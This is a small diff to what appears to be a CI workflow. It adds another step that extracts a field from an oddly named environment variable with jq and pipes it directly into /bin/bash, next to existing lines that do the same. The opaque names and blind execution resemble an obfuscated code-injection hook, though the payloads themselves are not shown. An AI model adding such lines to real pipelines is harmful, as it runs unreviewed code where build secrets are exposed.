@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$fqp02434" | jq -r .ewpn207 | /bin/bash
           printf '%s' "$j182" | jq -r .sb96121 | /bin/bash
           echo $pzj9 | jq -r .fx6 | /bin/bash
+          echo $qcld9 | jq -r .p420 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
